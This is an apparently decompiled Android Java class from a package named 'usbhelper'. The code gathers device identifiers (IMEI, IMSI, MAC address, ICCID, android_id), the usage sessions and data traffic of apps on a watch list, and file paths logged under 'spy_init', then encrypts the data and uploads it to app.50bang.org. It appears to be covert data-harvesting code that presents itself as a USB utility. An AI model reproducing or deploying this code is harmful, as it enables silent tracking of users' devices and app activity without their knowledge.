package com.service.usbhelper.data;

import android.content.ContentValues;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.SystemClock;
import android.text.TextUtils;
import com.service.usbhelper.MyApplication;
import com.service.usbhelper.db.C0211b;
import com.service.usbhelper.db.TJBaseModel;
import com.service.usbhelper.db.p013a.C0209b;
import com.service.usbhelper.db.p013a.p014a.C0205a;
import com.service.usbhelper.db.p013a.p014a.C0206b;
import com.service.usbhelper.db.p013a.p014a.C0207c;
import com.service.usbhelper.p010b.C0174a;
import com.service.usbhelper.p011c.C0183h;
import com.service.usbhelper.p015e.C0217f;
import com.service.usbhelper.p015e.C0222k;
import com.service.usbhelper.p015e.C0223l;
import com.service.usbhelper.p015e.EncryptUtil;
import com.service.usbhelper.p015e.Logooo;
import com.service.usbhelper.p015e.SharedPreferencesManager;
import com.service.usbhelper.p015e.C0229r;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import org.json.JSONArray;
import org.json.JSONObject;

/* renamed from: com.service.usbhelper.data.a */
public class C0192a {
    private static Object f207a;
    private static C0209b f208b;
    private static String f209c;

    static {
        f207a = new Object();
        f208b = C0209b.m421a();
    }

    public static ArrayList<C0198g> m389a(Context context) {
        List<String> e = C0217f.m489e(context, "watch_list");
        ArrayList a = C0211b.m443a(context);
        ArrayList<C0198g> arrayList = new ArrayList();
        SharedPreferences a2 = SharedPreferencesManager.getSharedPreferences(context, "watch_list");
        String str = "";
        try {
            for (String str2 : e) {
                String str3;
                TJBaseModel tJBaseModel;
                C0198g c0198g = new C0198g();
                Object string = a2.getString(str2, "");
                if (string == null || TextUtils.isEmpty(string)) {
                    c0198g.f220c = "";
                    c0198g.f219b = "";
                    str3 = "";
                } else {
                    String[] split = string.split(",");
                    if (split.length == 5) {
                        Logooo.e5("\u62fc\u63a5\u542f\u52a8\uff1a" + str2);
                        str = split[0];
                        c0198g.f220c = split[1];
                        c0198g.f219b = split[2];
                    } else {
                        str = "";
                        c0198g.f220c = "";
                        c0198g.f219b = "";
                    }
                    str3 = str;
                }
                c0198g.f218a = str3;
                c0198g.f221d = str2;
                Collection arrayList2 = new ArrayList();
                Iterator it = a.iterator();
                while (it.hasNext()) {
                    tJBaseModel = (TJBaseModel) it.next();
                    if (tJBaseModel.getPkgname().equals(str2)) {
                        arrayList2.add(tJBaseModel);
                    }
                }
                SharedPreferences a3 = SharedPreferencesManager.getSharedPreferences(context, str2);
                if (a3.getInt("app_is_start_sended", -1) == 0) {
                    tJBaseModel = new TJBaseModel();
                    tJBaseModel.appid = str3;
                    tJBaseModel.duration = a3.getInt("app_duration", -1);
                    tJBaseModel.session_id = a3.getInt("app_sessionid", 0);
                    tJBaseModel.start_sended = a3.getInt("app_is_start_sended", -1);
                    arrayList2.add(tJBaseModel);
                }
                if (!(arrayList2 == null || arrayList2.size() == 0)) {
                    c0198g.f222e.addAll(arrayList2);
                    arrayList.add(c0198g);
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return arrayList;
    }

    public static JSONObject m390a(int i, Context context, ArrayList<C0198g> arrayList, int i2) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("header", C0192a.m405c(context, i2));
            if (arrayList == null || arrayList.size() == 0) {
                jSONObject.put("body", "");
                Logooo.e4("USBHelper", "buildTjOtherInfo\uff1a" + i + ">>>>>>>>" + jSONObject.toString());
                return jSONObject;
            }
            ArrayList arrayList2 = new ArrayList();
            JSONObject jSONObject2 = new JSONObject();
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                C0198g c0198g = (C0198g) it.next();
                if (!c0198g.f218a.equals("0729cb54090d48ac0d347aa5748e2330")) {
                    JSONObject jSONObject3 = new JSONObject();
                    JSONArray jSONArray = new JSONArray();
                    JSONArray jSONArray2 = new JSONArray();
                    ArrayList c = c0198g.m411c();
                    if (!(c == null || c.size() == 0)) {
                        Iterator it2 = c.iterator();
                        while (it2.hasNext()) {
                            TJBaseModel tJBaseModel = (TJBaseModel) it2.next();
                            JSONObject jSONObject4 = new JSONObject();
                            JSONObject jSONObject5 = new JSONObject();
                            if (i != 1) {
                                if (tJBaseModel.getStart_sended() == 0) {
                                    jSONObject4.put("sessionid", tJBaseModel.getSession_id());
                                    jSONArray.put(jSONObject4);
                                }
                                if (tJBaseModel.getDuration() >= 0) {
                                    jSONObject5.put("sessionid", tJBaseModel.getSession_id());
                                    jSONObject5.put("duration", tJBaseModel.getDuration());
                                    jSONArray2.put(jSONObject5);
                                }
                            } else if (tJBaseModel.getStart_sended() == 0) {
                                jSONObject4.put("sessionid", tJBaseModel.getSession_id());
                                jSONArray.put(jSONObject4);
                            }
                        }
                        if (!((jSONArray.length() == 0 && jSONArray2.length() == 0) || TextUtils.isEmpty(c0198g.m410b()))) {
                            JSONObject jSONObject6 = new JSONObject();
                            jSONObject6.put("app_version", c0198g.m412d());
                            jSONObject6.put("appcid", c0198g.m413e());
                            if (i != 1 || jSONArray == null || jSONArray.length() <= 0) {
                                if (jSONArray != null && jSONArray.length() > 0) {
                                    jSONObject3.put("launch", jSONArray);
                                }
                                if (jSONArray2 != null && jSONArray2.length() > 0) {
                                    jSONObject3.put("terminate", jSONArray2);
                                }
                            } else {
                                jSONObject3.put("launch", jSONArray);
                            }
                            jSONObject3.put("appstate", jSONObject6);
                            jSONObject2.put(c0198g.m410b(), jSONObject3);
                            jSONObject.put("body", jSONObject2);
                        }
                    }
                }
            }
            Logooo.e4("USBHelper", "buildTjOtherInfo\uff1a" + i + ">>>>>>>>" + jSONObject.toString());
            return jSONObject;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static JSONObject m391a(Context context, int i) {
        Object obj;
        Object obj2;
        String b = C0223l.getUid(context);
        String c = C0229r.getAccess(context);
        String packageName = context.getPackageName();
        String str = "";
        str = "";
        String str2 = Build.BRAND;
        String a = C0229r.getPromotionMethod(context, "promotion_method");
        String h = C0229r.getMetaInf(context);
        try {
            obj = context.getPackageManager().getPackageInfo(packageName, 0).versionName;
            obj2 = context.getPackageManager().getPackageInfo(packageName, 0).versionCode + "";
        } catch (Exception e) {
            obj = "";
            obj2 = "";
        }
        String str3 = Build.MODEL;
        String str4 = "Android";
        String str5 = VERSION.RELEASE;
        String a2 = C0229r.getResolution(context);
        Object a3 = C0217f.getChannel(context);
        if (TextUtils.isEmpty(a3)) {
            a3 = C0229r.getPromotionMethod(context, "UMENG_CHANNEL");
        }
        Object a4 = C0229r.getPromotionMethod(context, "project_name");
        if (TextUtils.isEmpty(a4)) {
            a4 = context.getPackageName();
        }
        String a5 = C0223l.getImei(context);
        String d = C0229r.getSubscriberId(context);
        String a6 = C0223l.getMac();
        String c2 = C0217f.getCid(context);
        String d2 = C0223l.m502d(context);
        JSONObject jSONObject = new JSONObject();
        try {
            JSONObject jSONObject2 = new JSONObject();
            Object c3 = C0223l.getUuid(MyApplication.getCt());
            String str6 = "uuid";
            if (c3 == null) {
                c3 = "";
            }
            jSONObject2.put(str6, c3);
            String str7 = "";
            SharedPreferences a7 = SharedPreferencesManager.getSharedPreferences(context);
            if (a7 != null) {
                str6 = a7.getString("tccode", "");
                CharSequence b2 = C0217f.m479b(context);
                if (!(TextUtils.isEmpty(b2) || str6.equals(b2))) {
                    jSONObject2.put("tccode", b2);
                    a7.edit().putString("tccode", b2).commit();
                }
            }
            jSONObject2.put("uid", b);
            jSONObject2.put("access", c);
            jSONObject2.put("package", packageName);
            jSONObject2.put("app_version", obj);
            jSONObject2.put("version_code", obj2);
            jSONObject2.put("channel", a3);
            jSONObject2.put("brand", str2);
            jSONObject2.put("device_model", str3);
            jSONObject2.put("android_id", d2);
            jSONObject2.put("promotion_method", a);
            jSONObject2.put("total_time", SystemClock.elapsedRealtime() / 1000);
            JSONObject jSONObject3 = new JSONObject();
            jSONObject3.put("imei", a5);
            jSONObject3.put("imsi", d);
            jSONObject3.put("wmac", a6);
            jSONObject2.put("local_id", jSONObject3);
            jSONObject2.put("os", str4);
            jSONObject2.put("os_version", str5);
            jSONObject2.put("project_name", a4);
            jSONObject2.put("resolution", a2);
            jSONObject2.put("sdk_version", "u1.0");
            jSONObject2.put("run_type", i);
            jSONObject2.put("toolcid", c2);
            jSONObject2.put("supplier", h);
            jSONObject2.put("sys_can_uninstall", C0229r.m517a());
            jSONObject3 = new JSONObject();
            jSONObject3.put("launch", "");
            jSONObject.put("header", jSONObject2);
            jSONObject.put("body", jSONObject3);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        Logooo.e4("USBHelper", "\u7edf\u8ba1\u6a21\u5757\u81ea\u8eab\u4fe1\u606f\uff1a" + i + ">>>>>>>>" + jSONObject.toString());
        return jSONObject;
    }

    public static JSONObject m392a(Context context, int i, String str) {
        JSONObject a = C0192a.m391a(context, i);
        Logooo.e4("song", "\u62c9\u8d77\u65e5\u5fd7header-----11111\uff1a" + a.toString());
        try {
            JSONObject jSONObject = a.getJSONObject("header");
            jSONObject.put("src_package", str);
            a.put("header", jSONObject);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Logooo.e4("song", "\u62c9\u8d77\u65e5\u5fd7header\uff1a" + a.toString());
        return a;
    }

    private static JSONObject m393a(List<C0207c> list) {
        JSONObject jSONObject = new JSONObject();
        SharedPreferences a = SharedPreferencesManager.getSharedPreferences(MyApplication.getCt(), "watch_list");
        try {
            jSONObject.put("header", C0192a.m405c(MyApplication.getCt(), 1));
            if (list == null || list.size() == 0) {
                jSONObject.put("body", "");
                Logooo.e4("traffic", "buildTrafficInfo\uff1a>>>>>>>>" + jSONObject.toString());
                return jSONObject;
            }
            JSONObject jSONObject2 = new JSONObject();
            for (C0207c c0207c : list) {
                if (!TextUtils.isEmpty(c0207c.f256a)) {
                    Object string = a.getString(c0207c.f256a, "");
                    if (!TextUtils.isEmpty(string)) {
                        String[] split = string.split(",");
                        if (split.length == 5) {
                            JSONObject jSONObject3 = new JSONObject();
                            JSONObject jSONObject4 = new JSONObject();
                            JSONObject jSONObject5 = new JSONObject();
                            JSONArray jSONArray = new JSONArray();
                            jSONObject4.put("sessionid", System.currentTimeMillis() / 1000);
                            jSONArray.put(jSONObject4);
                            jSONObject3.put("launch", jSONArray);
                            jSONObject4 = new JSONObject();
                            jSONObject4.put("app_version", split[2]);
                            jSONObject4.put("appcid", split[1]);
                            jSONObject3.put("appstate", jSONObject4);
                            jSONObject5.put("datatraffic", c0207c.f257b);
                            jSONObject5.put("duration", "99999");
                            jSONObject3.put("terminate", jSONObject5);
                            jSONObject2.put(split[0], jSONObject3);
                        }
                    }
                }
            }
            jSONObject.put("body", jSONObject2);
            Logooo.e4("traffic", "buildTrafficInfo\uff1a>>>>>>>>" + jSONObject.toString());
            return jSONObject;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void m394a() {
        try {
            SharedPreferences a = SharedPreferencesManager.getSharedPreferences(MyApplication.getCt(), "init_path");
            Map all = a.getAll();
            if (all != null) {
                String str;
                List<String> arrayList = new ArrayList();
                for (Entry entry : all.entrySet()) {
                    String str2 = (String) entry.getValue();
                    str = (String) entry.getKey();
                    if (new File(str).exists()) {
                        try {
                            String[] split = str2.split(",");
                            if (split.length == 3 && "1".equals(split[0])) {
                                ContentValues contentValues = new ContentValues();
                                contentValues.put("app_id", split[1]);
                                contentValues.put("package", split[2]);
                                contentValues.put("type", "create");
                                contentValues.put("path", str);
                                contentValues.put("occurred_time", Integer.valueOf(1));
                                Logooo.e8("TJFile", "spy_init insert to db, wait to send....");
                                C0209b.m421a().m425a(contentValues);
                                arrayList.add(str);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
                Editor edit = a.edit();
                for (String str3 : arrayList) {
                    if (a.contains(str3)) {
                        edit.putString(str3, "0");
                    }
                }
                edit.commit();
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void m395a(int i, Context context) {
        if (C0229r.m527b(context) && !C0229r.m548j(context)) {
            C0192a.m394a();
            new C0193b(context, i).start();
        }
    }

    public static void m396a(int i, Context context, String str) {
        if (C0229r.m527b(context) && !C0229r.m548j(context)) {
            new C0194c(context, i, str).start();
        }
    }

    public static void m397a(ArrayList<C0205a> arrayList, int i) {
        if (arrayList != null && C0229r.m527b(MyApplication.getCt()) && arrayList.size() != 0) {
            try {
                JSONObject b = C0192a.m399b(2, MyApplication.getCt(), arrayList, i);
                if (b.optJSONObject("body") == null || b.optJSONObject("body").length() <= 0) {
                    SharedPreferencesManager.getSharedPreferences(MyApplication.getCt()).edit().putLong("last_send_other_stamp", System.currentTimeMillis() / 1000).commit();
                    return;
                }
                Object a = C0183h.m338a().m340a("", "http://app.50bang.org/tongji_module_v2/?_c=log&action=sendData", EncryptUtil.encrypt(C0229r.getPromotionMethod(MyApplication.getCt(), "app_key"), b.toString()), MyApplication.getCt());
                Logooo.e4("USBHelper", "sendTjOtherRunningInfo\uff1a>>>>>>>>" + a);
                if (a != null && !TextUtils.isEmpty(a)) {
                    JSONObject jSONObject = new JSONObject(a);
                    if (jSONObject.getLong("code") == 200) {
                        f208b.m429b();
                        SharedPreferencesManager.getSharedPreferences(MyApplication.getCt()).edit().putLong("servertime", jSONObject.getJSONObject("data").getLong("st")).commit();
                        Iterator it = arrayList.iterator();
                        while (it.hasNext()) {
                            C0205a c0205a = (C0205a) it.next();
                            if (!TextUtils.isEmpty(c0205a.f253g)) {
                                SharedPreferencesManager.getSharedPreferences(MyApplication.getCt(), c0205a.f253g).edit().clear().commit();
                            }
                        }
                        SharedPreferencesManager.getSharedPreferences(MyApplication.getCt()).edit().putLong("last_send_other_stamp", System.currentTimeMillis() / 1000).commit();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void m398a(ArrayList<C0198g> arrayList, Context context, int i) {
        if ((arrayList != null && C0229r.m527b(context) && arrayList.size() != 0) || i != 0) {
            try {
                JSONObject a = C0192a.m390a(2, context, arrayList, i);
                if (a.getJSONObject("body").length() > 0) {
                    Object a2 = C0183h.m338a().m340a("http://app.50bang.org/tongji_module/?_c=log&action=session", "http://app.50bang.org/tongji_module/?_c=log&action=sendData", EncryptUtil.encrypt(C0229r.getPromotionMethod(context, "app_key"), a.toString()), context);
                    Logooo.e4("USBHelper", "sendTjOtherRunningInfo\uff1a>>>>>>>>" + a2);
                    if (a2 != null && !TextUtils.isEmpty(a2)) {
                        JSONObject jSONObject = new JSONObject(a2);
                        if (jSONObject.getLong("code") == 200) {
                            C0211b.m444a(context, (ArrayList) arrayList);
                            SharedPreferencesManager.getSharedPreferences(context).edit().putLong("servertime", jSONObject.getJSONObject("data").getLong("st")).commit();
                            Iterator it = arrayList.iterator();
                            while (it.hasNext()) {
                                C0198g c0198g = (C0198g) it.next();
                                if (!TextUtils.isEmpty(c0198g.m409a())) {
                                    SharedPreferencesManager.getSharedPreferences(context, c0198g.m409a()).edit().clear().commit();
                                    SharedPreferencesManager.getSharedPreferences(context).edit().putLong("last_send_other_stamp", System.currentTimeMillis() / 1000).commit();
                                    Logooo.e6("songyx", "xml\u7b2c\u4e09\u65b9\u8fd0\u884cdelete\uff1a" + c0198g.m409a());
                                }
                            }
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static JSONObject m399b(int i, Context context, ArrayList<C0205a> arrayList, int i2) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("header", C0192a.m405c(context, i2));
            if (arrayList == null || arrayList.size() == 0) {
                jSONObject.put("body", "");
                Logooo.e4("USBHelper", "buildTjOtherInfo\uff1a" + i + ">>>>>>>>" + jSONObject.toString());
                return jSONObject;
            }
            HashMap hashMap = new HashMap();
            JSONObject jSONObject2 = new JSONObject();
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                C0205a c0205a = (C0205a) it.next();
                if (!c0205a.f248b.equals("0729cb54090d48ac0d347aa5748e2330")) {
                    JSONObject jSONObject3 = new JSONObject();
                    HashMap hashMap2 = c0205a.f247a;
                    if (!(hashMap2 == null || hashMap2.size() == 0)) {
                        try {
                            for (Entry entry : hashMap2.entrySet()) {
                                JSONArray jSONArray = new JSONArray();
                                String str = (String) entry.getKey();
                                List<C0206b> list = (List) entry.getValue();
                                if (!(TextUtils.isEmpty(str) || list == null || list.size() == 0)) {
                                    for (C0206b c0206b : list) {
                                        JSONObject jSONObject4 = new JSONObject();
                                        jSONObject4.put("path", c0206b.f254a);
                                        jSONObject4.put("times", c0206b.f255b);
                                        jSONArray.put(jSONObject4);
                                    }
                                    if (jSONArray == null) {
                                        continue;
                                    } else if (jSONArray.length() != 0) {
                                        jSONObject3.put(str, jSONArray);
                                    }
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    if (!TextUtils.isEmpty(c0205a.f248b)) {
                        JSONObject jSONObject5 = new JSONObject();
                        jSONObject5.put("app_version", c0205a.f251e);
                        jSONObject5.put("appcid", c0205a.f252f);
                        jSONObject3.put("appstate", jSONObject5);
                        jSONObject3.put("duration", c0205a.f250d);
                        jSONObject3.put("frequency", c0205a.f249c);
                        jSONObject2.put(c0205a.f248b, jSONObject3);
                        jSONObject.put("body", jSONObject2);
                    }
                }
            }
            Logooo.e4("USBHelper", "buildTjOtherInfo\uff1a" + i + ">>>>>>>>" + jSONObject.toString());
            return jSONObject;
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static JSONObject getCommonInfo(Context context) {
        String versionName;
        String versionCode;
        String packageName = context.getPackageName();
        try {
            versionName = context.getPackageManager().getPackageInfo(packageName, 0).versionName;
            versionCode = context.getPackageManager().getPackageInfo(packageName, 0).versionCode + "";
        } catch (Exception e) {
            versionName = "";
            versionCode = "";
        }
        String channel = C0217f.getChannel(context);
        if (TextUtils.isEmpty(channel)) {
            channel = C0229r.getPromotionMethod(context, "UMENG_CHANNEL");
        }
        String projectName = C0229r.getPromotionMethod(context, "project_name");
        if (TextUtils.isEmpty(projectName)) {
            projectName = context.getPackageName();
        }
        JSONObject jSONObject = new JSONObject();
        try {
            String uuid = C0223l.getUuid(MyApplication.getCt());
            if (uuid == null) {
                uuid = "";
            }
            jSONObject.put("uuid", uuid);
            jSONObject.put("uid", C0223l.getUid(context));
            jSONObject.put("access", C0229r.getAccess(context));
            jSONObject.put("package", packageName);
            jSONObject.put("app_version", versionName);
            jSONObject.put("version_code", versionCode);
            jSONObject.put("channel", channel);
            jSONObject.put("brand", Build.BRAND);
            jSONObject.put("device_model", Build.MODEL);
            jSONObject.put("android_id", C0223l.m502d(context));
            jSONObject.put("promotion_method", C0229r.getPromotionMethod(context, "promotion_method"));
            jSONObject.put("total_time", SystemClock.elapsedRealtime() / 1000);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("imei", C0223l.getImei(context));
            jSONObject2.put("imsi", C0229r.getSubscriberId(context));
            jSONObject2.put("wmac", C0223l.getMac());
            jSONObject.put("supplier", C0229r.getMetaInf(context));
            jSONObject.put("local_id", jSONObject2);
            jSONObject.put("os", "Android");
            jSONObject.put("os_version", VERSION.RELEASE);
            jSONObject.put("project_name", projectName);
            jSONObject.put("resolution", C0229r.getResolution(context));
            jSONObject.put("sdk_version", "u1.0");
            jSONObject.put("run_type", 5);
            jSONObject.put("toolcid", C0217f.getCid(context));
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        Logooo.e4("USBHelper", "手机app 相关信息：" + ">>>>>>>>" + jSONObject.toString());
        return jSONObject;
    }

    public static void m401b() {
        if (C0229r.m527b(MyApplication.getCt())) {
            try {
                List<C0207c> c = C0209b.m421a().m432c();
                if (c != null && c.size() != 0) {
                    JSONObject a = C0192a.m393a((List) c);
                    if (a.getJSONObject("body").length() > 0) {
                        Object a2 = C0183h.m338a().m340a("http://app.50bang.org/tongji_module_v2/?_c=flowrate&action=session", "http://app.50bang.org/tongji_module_v2/?_c=flowrate&action=sendData", EncryptUtil.encrypt(C0229r.getPromotionMethod(MyApplication.getCt(), "app_key"), a.toString()), MyApplication.getCt());
                        if (a2 != null && !TextUtils.isEmpty(a2) && new JSONObject(a2).getLong("code") == 200) {
                            for (C0207c c0207c : c) {
                                if (!TextUtils.isEmpty(c0207c.f256a)) {
                                    ContentValues contentValues = new ContentValues();
                                    contentValues.put("traffic_used", Long.valueOf(C0229r.m535e(c0207c.f256a)));
                                    contentValues.put("stamp", Long.valueOf((System.currentTimeMillis() / 1000) + 10800));
                                    C0209b.m421a().m423a(contentValues, c0207c.f256a);
                                }
                            }
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void m402b(Context context) {
        context.registerReceiver(new C0196e(), new IntentFilter("android.intent.action.BATTERY_CHANGED"));
    }

    public static void m403b(ArrayList<C0198g> arrayList, Context context, int i) {
        if (arrayList != null && C0229r.m527b(context) && arrayList.size() != 0) {
            new C0195d(context, arrayList, i).start();
        }
    }

    public static ArrayList<C0198g> m404c() {
        Context a = MyApplication.getCt();
        List<String> e = C0217f.m489e(a, "watch_list");
        ArrayList b = C0211b.m446b(a);
        Logooo.e3("getAllInfo tjBaseModels:" + b.toString());
        ArrayList<C0198g> arrayList = new ArrayList();
        SharedPreferences a2 = SharedPreferencesManager.getSharedPreferences(a, "watch_list");
        String str = "";
        try {
            for (String str2 : e) {
                String str3;
                TJBaseModel tJBaseModel;
                C0198g c0198g = new C0198g();
                Object string = a2.getString(str2, "");
                if (string == null || TextUtils.isEmpty(string)) {
                    c0198g.f220c = "";
                    c0198g.f219b = "";
                    str3 = "";
                } else {
                    String[] split = string.split(",");
                    if (split.length == 5) {
                        str = split[0];
                        c0198g.f220c = split[1];
                        c0198g.f219b = split[2];
                    } else {
                        str = "";
                        c0198g.f220c = "";
                        c0198g.f219b = "";
                    }
                    str3 = str;
                }
                c0198g.f218a = str3;
                c0198g.f221d = str2;
                Collection arrayList2 = new ArrayList();
                Iterator it = b.iterator();
                while (it.hasNext()) {
                    tJBaseModel = (TJBaseModel) it.next();
                    if (tJBaseModel.getPkgname().equals(str2)) {
                        arrayList2.add(tJBaseModel);
                    }
                }
                SharedPreferences a3 = SharedPreferencesManager.getSharedPreferences(a, str2);
                tJBaseModel = new TJBaseModel();
                tJBaseModel.appid = str3;
                tJBaseModel.duration = a3.getInt("app_duration", -1);
                tJBaseModel.session_id = a3.getInt("app_sessionid", 0);
                tJBaseModel.start_sended = a3.getInt("app_is_start_sended", -1);
                if (tJBaseModel.session_id > 0) {
                    arrayList2.add(tJBaseModel);
                }
                if (!(arrayList2 == null || arrayList2.size() == 0)) {
                    c0198g.f222e.addAll(arrayList2);
                    arrayList.add(c0198g);
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        Logooo.e3("getOtherRunningInfo: bodys" + arrayList.toString());
        return arrayList;
    }

    public static JSONObject m405c(Context context, int i) {
        Object obj;
        Object obj2;
        String b = C0223l.getUid(context);
        long a = (long) C0222k.m491a();
        String c = C0217f.getCid(context);
        Object a2 = C0223l.getImei(context);
        String d = C0229r.getSubscriberId(context);
        String a3 = C0223l.getMac();
        String str = Build.MODEL;
        String c2 = C0229r.getAccess(context);
        String str2 = VERSION.RELEASE;
        String d2 = C0223l.m502d(context);
        String str3 = "";
        str3 = "";
        String str4 = Build.BRAND;
        String packageName = context.getPackageName();
        String a4 = C0229r.getPromotionMethod(context, "promotion_method");
        String h = C0229r.getMetaInf(context);
        String a5 = C0229r.getResolution(context);
        Object g = C0229r.m541g(context);
        if (TextUtils.isEmpty(g)) {
            g = "";
        }
        String str5 = f209c;
        try {
            obj = context.getPackageManager().getPackageInfo(packageName, 0).versionName;
            obj2 = context.getPackageManager().getPackageInfo(packageName, 0).versionCode + "";
        } catch (Exception e) {
            obj = "";
            obj2 = "";
        }
        JSONObject jSONObject = new JSONObject();
        try {
            if (C0223l.m498b()) {
                jSONObject.put("yun_os_version", C0223l.m499c());
            }
            Object c3 = C0223l.getUuid(MyApplication.getCt());
            String str6 = "uuid";
            if (c3 == null) {
                c3 = "";
            }
            jSONObject.put(str6, c3);
            jSONObject.put("uid", b);
            jSONObject.put("android_id", d2);
            jSONObject.put("send_time", a);
            jSONObject.put("toolcid", c);
            jSONObject.put("brand", str4);
            jSONObject.put("promotion_method", a4);
            jSONObject.put("background", i);
            jSONObject.put("total_time", SystemClock.elapsedRealtime() / 1000);
            if (TextUtils.isEmpty(a2)) {
                a2 = "";
            }
            jSONObject.put("app_version", obj);
            jSONObject.put("version_code", obj2);
            jSONObject.put("imei", a2);
            jSONObject.put("imsi", d);
            jSONObject.put("wmac", a3);
            jSONObject.put("supplier", h);
            jSONObject.put("device_model", str);
            jSONObject.put("access", c2);
            jSONObject.put("os_version", str2);
            jSONObject.put("resolution", a5);
            jSONObject.put("iccid", g);
            jSONObject.put("battery", str5);
            jSONObject.put("sys_can_uninstall", C0229r.m517a());
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return jSONObject;
    }

    public static ArrayList<C0205a> m406d() {
        ArrayList<C0205a> arrayList = new ArrayList();
        Context a = MyApplication.getCt();
        List<String> e = C0217f.m489e(a, "watch_list");
        SharedPreferences a2 = SharedPreferencesManager.getSharedPreferences(a, "watch_list");
        if (e == null || e.size() == 0) {
            return null;
        }
        for (String str : e) {
            C0205a a3 = f208b.m427a(str);
            if (a3 != null) {
                SharedPreferences a4 = SharedPreferencesManager.getSharedPreferences(a, str);
                long j = a4.getLong("app_file_observer_duration", 0);
                a3.f249c = C0174a.f131b;
                a3.f250d = j;
                if (TextUtils.isEmpty(a3.f248b)) {
                    a3.f248b = a4.getString("app_appid", "");
                }
                Object string = a2.getString(str, "");
                if (string == null || TextUtils.isEmpty(string)) {
                    a3.f252f = "";
                    a3.f251e = "";
                } else {
                    String[] split = string.split(",");
                    if (split.length == 5) {
                        a3.f252f = split[1];
                        a3.f251e = split[2];
                    } else {
                        a3.f252f = "";
                        a3.f251e = "";
                    }
                }
                a3.f253g = str;
                arrayList.add(a3);
            }
        }
        Logooo.e3("getOtherRunningInfo: tjBaseModels" + arrayList.toString());
        return arrayList;
    }
}
